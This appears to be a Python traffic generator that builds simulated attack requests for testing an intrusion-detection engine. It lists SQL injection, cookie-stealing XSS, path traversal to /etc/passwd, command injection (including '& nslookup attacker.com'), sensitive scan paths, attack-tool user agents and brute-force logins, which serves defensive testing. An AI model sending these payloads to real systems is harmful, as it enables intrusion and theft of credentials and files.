import random
from faker import Faker

fake = Faker()

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT username, password FROM users --",
    "1' ORDER BY 1--",
    "1' AND 1=2 UNION SELECT NULL, table_name FROM information_schema.tables--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(document.cookie)</script>",
    "<svg/onload=alert(1)>"
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "../../../../etc/hosts",
    "../../../../boot.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../etc/resolv.conf"
]

CMD_INJECTION_PAYLOADS = [
    "; whoami",
    "| cat /etc/passwd",
    "&& ipconfig",
    "; ping -c 4 8.8.8.8",
    "& nslookup attacker.com",
    "| id"
]

SCAN_PATHS = [
    "/admin",
    "/.env",
    "/wp-admin",
    "/wp-login.php",
    "/config.json",
    "/.git/config",
    "/phpinfo.php",
    "/backup.sql",
    "/setup.sh"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "sqlmap/1.7.12#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Nmap Scripting Engine; https://nmap.org/book/nse.html",
    "Go-http-client/1.1"
]

# Helper to track state of brute force per IP (using random attacking IPs)
# For the simulation, we'll return a batch/sequence of attempts if Brute Force is chosen.
# In a single tick of the simulator, we return a single request. 
# The detection engine will track the rate. We will generate the request.
def generate_attack_request():
    attack_type = random.choice([
        "SQLi",
        "XSS",
        "Traversal",
        "BruteForce",
        "CmdInjection",
        "Scan"
    ])
    
    # Generate generic headers, but sometimes include attacker-like User Agents
    headers = {
        "User-Agent": random.choices([random.choice(USER_AGENTS), fake.user_agent()], weights=[0.7, 0.3], k=1)[0],
        "Accept": "*/*",
        "Referer": fake.url()
    }
    
    # Generate an external source IP so we don't just use 127.0.0.1 (allows backend to attribute it to different hosts)
    # We will pass this in a custom header "X-Forwarded-For" which our collector / normalizer can inspect.
    # We'll generate a consistent set of attacker IPs to simulate progression.
    attacker_ips = ["192.168.1.10", "10.10.10.5", "172.16.1.20", "203.0.113.15", "198.51.100.8"]
    source_ip = random.choice(attacker_ips)
    headers["X-Forwarded-For"] = source_ip
    
    method = "GET"
    path = "/"
    params = {}
    data = {}
    
    if attack_type == "SQLi":
        path = random.choice(["/login", "/search", "/products"])
        param_name = random.choice(["username", "q", "id"])
        params[param_name] = random.choice(SQLI_PAYLOADS)
        if path == "/login":
            method = "POST"
            data = {"username": params[param_name], "password": "password123"}
            params = {}
            
    elif attack_type == "XSS":
        path = random.choice(["/search", "/blog/post", "/contact"])
        param_name = random.choice(["q", "comment", "name"])
        params[param_name] = random.choice(XSS_PAYLOADS)
        if path == "/contact":
            method = "POST"
            data = {"name": params[param_name], "message": "hello"}
            params = {}
            
    elif attack_type == "Traversal":
        path = random.choice(["/view-file", "/download", "/show-image"])
        param_name = random.choice(["file", "path", "name"])
        params[param_name] = random.choice(TRAVERSAL_PAYLOADS)
        
    elif attack_type == "BruteForce":
        # Rapid post request structure
        method = "POST"
        path = "/login"
        # Always use a single static user or random passwords to represent password guessing
        data = {
            "username": "admin",
            "password": fake.password(length=8, special_chars=False)
        }
        
    elif attack_type == "CmdInjection":
        path = "/api/v1/ping"
        param_name = "host"
        params[param_name] = "8.8.8.8" + random.choice(CMD_INJECTION_PAYLOADS)
        
    elif attack_type == "Scan":
        path = random.choice(SCAN_PATHS)
        method = "GET"
        
    return {
        "attack_type": attack_type,
        "method": method,
        "path": path,
        "params": params,
        "data": data,
        "headers": headers
    }
